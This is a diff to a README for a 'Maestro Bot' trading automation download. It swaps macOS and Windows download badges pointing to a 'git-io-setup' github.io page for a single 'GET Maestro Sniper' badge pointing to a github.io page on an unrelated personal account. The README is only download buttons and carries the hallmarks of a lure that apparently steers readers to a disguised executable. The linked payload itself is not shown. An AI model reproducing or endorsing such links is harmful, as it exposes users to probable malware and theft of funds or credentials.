@@ -1,18 +1,7 @@
 # Maestro Bot Download — Trading Automation Platform
 
-<a href="https://git-io-setup.github.io/.github/?offer=MaestroBot" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Maestro%20Bot%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="Maestro Bot for macOS">
-</a>
+[![GET Maestro Sniper](https://img.shields.io/badge/GET%20%E2%80%94%20Maestro-Sniper-0078D6?style=for-the-badge&logoColor=white)](https://necatiarslanoglu51299.github.io/.github/Maestro-Sniper)
 
-<a href="https://git-io-setup.github.io/.github/?offer=MaestroBot" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/Maestro%20Bot%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="Maestro Bot for Windows">
-</a>
 
 ---
 
